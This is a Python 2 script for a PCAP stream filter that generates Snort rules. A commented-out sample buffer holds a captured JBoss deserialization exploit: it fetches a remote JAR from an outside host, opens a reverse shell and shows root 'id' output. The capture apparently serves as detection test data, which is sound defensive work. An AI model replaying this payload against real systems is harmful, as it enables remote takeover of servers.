# coding=utf-8
import sys
import os
from conf.app import DEFAULT_DATA
from modules.pcap_scanner import PcapScanner
from modules.pcap_parser import PcapParser
import argparse
from argparse import RawTextHelpFormatter


def user_args():
    print "\033[33m\t\t---------- PcapFilter ----------\033[0m"
    description = "\033[32mThis script filter a network packet from a PCAP file.\033[0m"
    example = "\n\nexample:\n\t[-] 以Stream流的方式分割Pcap包并过滤,将符合的首个Stream包生成新Pcap文件:\n\t" \
        "python2 main.py -i jboss.pcap -t streamn\n\t[-] 以Stream流的方式分割Pcap包并过滤,将所有符合的Stream包输出到不同Pcap文件:\n\t" \
        "python2 main.py -i jboss.pcap -t streamn --multi true\n\t[-] 过滤包并生成snort规则:\n\t" \
        "python2 main.py -i pcap/jboss.pcap -t stream --snort true --multi true"
    # output = "\n\noutput:\n\txxx.json | {'pcapfile': '<output>.pcap', 'Pcap2Snort': <Hash Object>}"
    description += example
    parser = argparse.ArgumentParser(description=description, prog='python2 main.py', formatter_class=RawTextHelpFormatter)                        # description参数可以用于插入描述脚本用途的信息，可以为空
    parser.add_argument('-i', required=True, help='input pcap filepath')               # 添加--verbose标签，标签别名可以为-v，这里action的意思是当读取的参数中出现--verbose/-v的时候
    # parser.add_argument('-o', help='output pcap filename')
    parser.add_argument('-r', help='input aspect data, default={}'.format(DEFAULT_DATA))
    parser.add_argument('-t', choices=['stream', 'single'], required=True, help="choose from <stream> pcap, <single> pcap")     # 参数字典的verbose建对应的值为True，而help参数用于描述--verbose参数的用途或意义。
    parser.add_argument('--multi', choices=['true', 'false'], default='false', help="The matching package is divided into several pcap files by stream, otherwise the matching will stop")
    parser.add_argument('--snort', choices=['true', 'false'], default='false', help='只输出snort规则, 否则只输出pcap文件和policy文件')
    args = parser.parse_args(sys.argv[1:])                                             # 将变量以标签-值的字典形式存入args字典
    return{'input': args.i, 'reader': args.r, 'type': args.t, 'multi': args.multi, 'snort': args.snort}


def main():
    map_table = user_args()
    datapath = map_table['reader']          # <exist?>    特征数据
    pcapfile = map_table['input']           # <exist?>    pcap输入包
    # newpcap = map_table['output']           # <no_exist?> pcap输出包
    pcaptype = map_table['type']            # 输出类型
    multi_stream = map_table['multi']
    snort = map_table['snort']

    if not datapath:
        datapath = DEFAULT_DATA
    if datapath and not os.path.exists(datapath):
        print('File not found!!! <{}>'.format(datapath))
        return
    if not os.path.exists(pcapfile):
        print('File not found!!! <{}>'.format(pcapfile))
        return
    # if newpcap and os.path.exists(newpcap):
    #     print('File already exist!!! <{}>'.format(newpcap))
    #     return
    # 1.获取数据包buf流
    ps = PcapScanner(pcapfile)
    stream_buf = ps.run()
    if not stream_buf:
        print('Failed find stream buf !!! <{}>'.format(pcapfile))
        return
    # print stream_buf

    # temp_buf = {
    #     '1001837255': [
    #         'RT\x00\x08M\x8dRT\x00!\x95(\x08\x00E\x00\x06\xf0\xac\xfe@\x00@\x06\xc9\x1c\xac\x1f2\xb2\xac\x1f2\xfc\xca\x14\x1f\x90;\xb6\xd2\xc8\xa76\xdaQ\x80\x18\x00\xe5\xc4\xcf\x00\x00\x01\x01\x08\n\x05$~;\x05#\x1a\xb7POST /invoker/readonly HTTP/1.1\r\nHost: 172.31.50.252:8080\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.25.0\r\nContent-Length: 1536\r\n\r\n\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x04sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x00\x17java.net.URLClassLoader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00>org.apache.commons.collections.functors.InstantiateTransformer4\x8b\xf4\x7f\xa4\x86\xd0;\x02\x00\x02[\x00\x05iArgst\x00\x13[Ljava/lang/Object;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x0f[Ljava.net.URL;RQ\xfd$\xc5\x1bh\xcd\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x1cL\x00\x04hostq\x00~\x00\x1cL\x00\x08protocolq\x00~\x00\x1cL\x00\x03refq\x00~\x00\x1cxp\xff\xff\xff\xff\xff\xff\xff\xfft\x00\x12www.joaomatosf.comt\x00"/rnp/java_files/JexRemoteTools.jarq\x00~\x00\x1et\x00\x04httppxur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x01vq\x00~\x00\x19sr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgsq\x00~\x00\x14L\x00\x0biMethodNameq\x00~\x00\x1c[\x00\x0biParamTypesq\x00~\x00\x15xpuq\x00~\x00\x17\x00\x00\x00\x01t\x00\nJexReverset\x00\tloadClassuq\x00~\x00!\x00\x00\x00\x01vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpsq\x00~\x00\x13uq\x00~\x00\x17\x00\x00\x00\x02t\x00\r172.31.50.178sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x11\\uq\x00~\x00!\x00\x00\x00\x02q\x00~\x00+vr\x00\x03int\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx',
    #         'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x004\xc0\xe6@\x00?\x06\xbc\xf0\xac\x1f2\xfc\xac\x1f2\xb2\x1f\x90\xca\x14\xa76\xdaQ;\xb6\xd9\x84\x80\x10\x00\xf6\xbe\x13\x00\x00\x01\x01\x08\n\x05#\x1a\xb7\x05$~;',
    #         'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x060\xc0\xe7@\x00?\x06\xb6\xf3\xac\x1f2\xfc\xac\x1f2\xb2\x1f\x90\xca\x14\xa76\xdaQ;\xb6\xd9\x84\x80\x18\x00\xf6\xc4\x0f\x00\x00\x01\x01\x08\n\x05#\x1c\xfb\x05$~;HTTP/1.1 500 Internal Server Error\r\nServer: Apache-Coyote/1.1\r\nContent-Type: text/html;charset=utf-8\r\nContent-Length: 1350\r\nDate: Sat, 28 Nov 2020 08:14:35 GMT\r\nConnection: close\r\n\r\n<html><head><title>JBoss Web/3.0.0-CR2 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation\n\torg.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)\n</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.</u></p><HR size="1" noshade="noshade"><h3>JBoss Web/3.0.0-CR2</h3></body></html>'
    #     ],
    #     '136080189': [
    #         'RT\x00\x08M\x8dRT\x00!\x95(\x08\x00E\x00\x007e\xca@\x00@\x06\x17\n\xac\x1f2\xb2\xac\x1f2\xfc\x11\\ @r\xe8\xe5\xb8\x08\x1ck>\x80\x18\x00\xe3\xbe\x16\x00\x00\x01\x01\x08\n\x05$\x80r\x05#\x1c\xeeid\n',
    #         'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x004w\xd2@\x00?\x06\x06\x05\xac\x1f2\xfc\xac\x1f2\xb2 @\x11\\\x08\x1ck>r\xe8\xe5\xbb\x80\x10\x00\xdd\xbe\x13\x00\x00\x01\x01\x08\n\x05#\x1c\xee\x05$\x80r',
    #         'RT\x00!\x95(RT\x00\x08M\x8d\x08\x00E\x00\x00[w\xd3@\x00?\x06\x05\xdd\xac\x1f2\xfc\xac\x1f2\xb2 @\x11\\\x08\x1ck>r\xe8\xe5\xbb\x80\x18\x00\xdd\xbe:\x00\x00\x01\x01\x08\n\x05#\x1d\x01\x05$\x80ruid=0(root) gid=0(root) groups=0(root)\n'
    #     ]
    # }
    # 2.将buf流再次进行过滤(后续使用多线程)
    pser = PcapParser(stream_buf=stream_buf, old_pcap=pcapfile, pcap_type=pcaptype, datapath=datapath, multi_stream=multi_stream, snort=snort)
    pser.run()
    print "\033[33m\t\t----------  Finished  ----------\033[0m"


# [*] 输出
if __name__ == "__main__":
    main()
